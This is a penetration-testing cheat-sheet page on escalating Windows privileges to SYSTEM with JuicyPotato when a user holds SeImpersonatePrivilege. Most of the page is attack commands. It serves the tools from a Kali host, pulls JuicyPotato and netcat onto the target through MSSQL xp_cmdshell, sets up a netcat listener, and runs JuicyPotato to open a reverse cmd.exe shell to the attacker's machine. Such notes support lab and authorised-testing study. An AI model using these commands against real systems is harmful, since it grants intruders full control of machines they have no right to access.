---
title: JuicyPotato
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - privilege
---
# 🥔 JuicyPotato

Escalating privileges to `SYSTEM` level when the command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed for our user.

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

Download from: [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)


**1.** Upload the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. 

```
# Serve the content from your kali attacking machine
python3 -m http.server 80

# If we have for example a myssql connection 
xp_cmdshell "powershell -c cd C:\Tools; wget http://IPfromOurKali/JuicyPotato.exe -outfile JuicyPotato.exe"
xp_cmdshell "powershell -c cd C:\Tools; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe"
```


**2.**  Set a listener in your attacking machine:

```
nc -lnvp 1234
```

**3.** Run JuicyPotato:

```
# From the myssql connection
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe $IPattackingMachine 1234 -e cmd.exe" -t *

# From a terminal run by an user with SeImpersonatePrivilege:
.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe  $IPattackingMachine 1234 -e cmd.exe" -t *
```

